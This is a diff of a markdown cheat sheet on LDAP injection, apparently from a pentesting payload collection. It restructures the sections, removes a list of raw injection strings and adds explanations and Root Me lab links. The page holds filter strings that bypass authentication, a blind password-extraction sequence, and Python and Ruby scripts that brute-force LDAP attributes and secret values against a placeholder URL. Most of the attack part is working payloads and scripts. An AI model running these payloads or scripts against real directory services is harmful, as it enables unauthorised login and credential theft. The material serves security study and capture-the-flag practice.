@@ -2,20 +2,30 @@
 
 > LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.
 
+
 ## Summary
 
-* [Exploitation](#exploitation)
-* [Payloads](#payloads)
-* [Blind Exploitation](#blind-exploitation)
-* [Defaults attributes](#defaults-attributes)
-* [Exploiting userPassword attribute](#exploiting-userpassword-attribute)
+* [Methodology](#methodology)
+    * [Authentication Bypass](#authentication-bypass)
+    * [Blind Exploitation](#blind-exploitation)
+* [Defaults Attributes](#defaults-attributes)
+* [Exploiting userPassword Attribute](#exploiting-userpassword-attribute)
 * [Scripts](#scripts)
-  * [Discover valid LDAP fields](#discover-valid-ldap-fields)
-  * [Special blind LDAP injection](#special-blind-ldap-injection)
+    * [Discover Valid LDAP Fields](#discover-valid-ldap-fields)
+    * [Special Blind LDAP Injection](#special-blind-ldap-injection)
+* [Labs](#labs)
+* [References](#references)
 
-## Exploitation
 
-Example 1.
+## Methodology
+
+LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping
+
+### Authentication Bypass
+
+Attempt to manipulate the filter logic by injecting always-true conditions.
+
+**Example 1**: This LDAP query exploits logical operators in the query structure to potentially bypass authentication
 
 ```sql
 user  = *)(uid=*))(|(uid=*
@@ -23,7 +33,7 @@ pass  = password
 query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
 ```
 
-Example 2
+**Example 2**: This LDAP query exploits logical operators in the query structure to potentially bypass authentication
 
 ```sql
 user  = admin)(!(&(1=0
@@ -31,34 +41,10 @@ pass  = q))
 query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
 ```
 
-## Payloads
 
-```text
-*
-*)(&
-*))%00
-)(cn=))\x00
-*()|%26'
-*()|&'
-*(|(mail=*))
-*(|(objectclass=*))
-*)(uid=*))(|(uid=*
-*/*
-*|
-/
-//
-//*
-@*
-|
-admin*
-admin*)((|userpassword=*)
-admin*)((|userPassword=*)
-x' or name()='username' or 'x'='y
-```
+### Blind Exploitation
 
-## Blind Exploitation
-
-We can extract using a bypass login
+This scenario demonstrates LDAP blind exploitation using a technique similar to binary search or character-based brute-forcing to discover sensitive information like passwords. It relies on the fact that LDAP filters respond differently to queries based on whether the conditions match or not, without directly revealing the actual password.
 
 ```sql
 (&(sn=administrator)(password=*))    : OK
@@ -78,7 +64,14 @@ We can extract using a bypass login
 (&(sn=administrator)(password=MYKE)) : OK
 ```
 
-## Defaults attributes
+**LDAP Filter Breakdown**
+
+* `&`: Logical AND operator, meaning all conditions inside must be true.
+* `(sn=administrator)`: Matches entries where the sn (surname) attribute is administrator.
+* `(password=X*)`: Matches entries where the password starts with X (case-sensitive). The asterisk (*) is a wildcard, representing any remaining characters.
+
+
+## Defaults Attributes
 
 Can be used in an injection like `*)(ATTRIBUTE_HERE=*`
 
@@ -94,7 +87,8 @@ givenName
 commonName
 ```
 
-## Exploiting userPassword attribute
+
+## Exploiting userPassword Attribute
 
 `userPassword` attribute is not a string like the `cn` attribute for example but it’s an OCTET STRING
 In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).
@@ -109,23 +103,20 @@ userPassword:2.5.13.18:=\xx\xx\xx
 
 ## Scripts
 
-### Discover valid LDAP fields
+### Discover Valid LDAP Fields
 
 ```python
 #!/usr/bin/python3
-
 import requests
 import string
 
 fields = []
-
 url = 'https://URL.com/'
-
-f = open('dic', 'r') #Open the wordlists of common attributes
-wordl = f.read().split('\n')
+f = open('dic', 'r')
+world = f.read().split('\n')
 f.close()
 
-for i in wordl:
+for i in world:
     r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
     if 'TRUE CONDITION' in r.text:
         fields.append(str(i))
@@ -133,13 +124,10 @@ for i in wordl:
 print(fields)
 ```
 
-Ref. [5][5]
-
-### Special blind LDAP injection (without "*")
+### Special Blind LDAP Injection
 
 ```python
 #!/usr/bin/python3
-
 import requests, string
 alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
 
@@ -154,16 +142,14 @@ for i in range(50):
             break
 ```
 
-Ref. [5][5]
+Exploitation script by [@noraj](https://github.com/noraj)
 
 ```ruby
 #!/usr/bin/env ruby
-
 require 'net/http'
 alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')
 
 flag = ''
-
 (0..50).each do |i|
   puts("[i] Looking for number #{i}")
   alphabet.each do |char|
@@ -177,21 +163,19 @@ flag = ''
 end
 ```
 
-By [noraj](https://github.com/noraj)
+
+## Labs
+
+* [Root Me - LDAP injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
+* [Root Me - LDAP injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Blind)
 
 
 ## References
 
-* [OWASP LDAP Injection](https://www.owasp.org/index.php/LDAP_injection)
-* [LDAP Blind Explorer](http://code.google.com/p/ldap-blind-explorer/)
-* [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN](https://0xukn.fr/posts/writeupecw2018admyssion/)
-* [Quals ECW 2018 - Maki](https://maki.bzh/courses/blog/writeups/qualecw2018/)
-* [How To Manage and Use LDAP Servers with OpenLDAP Utilities](https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities)
-* [How To Configure OpenLDAP and Perform Administrative LDAP Tasks](https://www.digitalocean.com/community/tutorials/how-to-configure-openldap-and-perform-administrative-ldap-tasks)
-* SSH key authentication via LDAP
-    - [How to setup LDAP server for openssh-lpk](https://openssh-ldap-pubkey.readthedocs.io/en/latest/openldap.html)
-    - [openssh-lpk.ldif](https://github.com/Lullabot/openldap-schema/blob/master/openssh-lpk.ldif)
-    - [Setting up OpenLDAP server with OpenSSH-LPK on Ubuntu 14.04](https://blog.shichao.io/2015/04/17/setup_openldap_server_with_openssh_lpk_on_ubuntu.html)
-    - [SSH key authentication using LDAP](https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap)
-    - [FR] [SSH et LDAP](https://wiki.lereset.org/ateliers:serveurmail:ldap-ssh)
-    - [SSH Public Keys in OpenLDAP](http://pig.made-it.com/ldap-openssh.html)
+- [[European Cyber Week] - AdmYSion - Alan Marrec (Maki)](https://www.maki.bzh/writeups/ecw2018admyssion/)
+- [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN - October 31, 2018](https://0xukn.fr/posts/writeupecw2018admyssion/)
+- [How To Configure OpenLDAP and Perform Administrative LDAP Tasks - Justin Ellingwood - May 30, 2015](https://www.digitalocean.com/community/tutorials/how-to-configure-openldap-and-perform-administrative-ldap-tasks)
+- [How To Manage and Use LDAP Servers with OpenLDAP Utilities - Justin Ellingwood - May 29, 2015](https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities)
+- [LDAP Blind Explorer - Alonso Parada - August 12, 2011](http://code.google.com/p/ldap-blind-explorer/)
+- [LDAP Injection & Blind LDAP Injection - Chema Alonso, José Parada Gimeno - October 10, 2008](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)
+- [LDAP Injection Prevention Cheat Sheet - OWASP - July 16, 2019](https://www.owasp.org/index.php/LDAP_injection)
